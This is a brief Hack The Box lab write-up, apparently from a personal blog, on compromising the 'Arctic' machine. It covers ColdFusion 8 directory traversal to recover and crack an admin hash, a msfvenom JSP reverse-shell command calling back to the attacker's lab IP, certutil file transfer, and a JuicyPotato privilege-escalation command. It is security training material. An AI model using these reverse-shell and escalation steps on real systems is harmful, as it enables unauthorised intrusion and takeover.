+++
title = "HTB - Arctic"
date = 2024-10-05
+++

### Scan
```
--------------------Starting Vulns Scan-----------------------

Running CVE scan on all ports



PORT      STATE SERVICE VERSION
135/tcp   open  msrpc   Microsoft Windows RPC
8500/tcp  open  fmtp?
49154/tcp open  msrpc   Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows



Running Vuln scan on all ports
This may take a while, depending on the number of detected services..



PORT      STATE SERVICE VERSION
135/tcp   open  msrpc   Microsoft Windows RPC
8500/tcp  open  fmtp?
49154/tcp open  msrpc   Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

```
### Enum
8500
Directory Listing via http
research on cold. Fusion 8 admin portal, directory traversal for passwd hash
https://nets.ec/Coldfusion_hacking read up on it here. 
pwd hash `2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03` - `happyday`
When logged in, we can look at mappings to see where to potentially place files. ` C:\ColdFusion8\wwwroot\CFIDE`
Once found, go to scheduled tasks, and use python link to serve jsp web executable shell from msfvenom.

`msfvenom -p java/jsp_shell_reverse_tcp lhost=10.10.14.11 lport=4321 -f raw -o pwn.jsp`

<img alt="Image" async src="images/Screenshot 2024-10-05 at 8.57.19 AM.png" width="800px"></img>

Go back to initial directory, and nagivate to the web shell

<img alt="Image" async src="images/Screenshot 2024-10-05 at 8.57.02 AM.png" width="800px"></img>

Shell <img alt="Image" async src="images/Screenshot 2024-10-05 at 8.57.38 AM.png" width="800px"></img>

SEImpersonate! Juicy pot! Rev shell!

make and go to temp dir. Move files over with certutil. then start listener for higher priv shell

`jp.exe -l 9999 -p rev.exe -t * -c {03ca98d6-ff5d-49b8-abc6-03dd84127020}`

higher priv!<img alt="Image" async src="images/Screenshot 2024-10-05 at 9.06.10 AM.png" width="800px"></img>

ROOT:47526c0fca39f552b54dc6b755bc82cb

### Init
### Priv Esc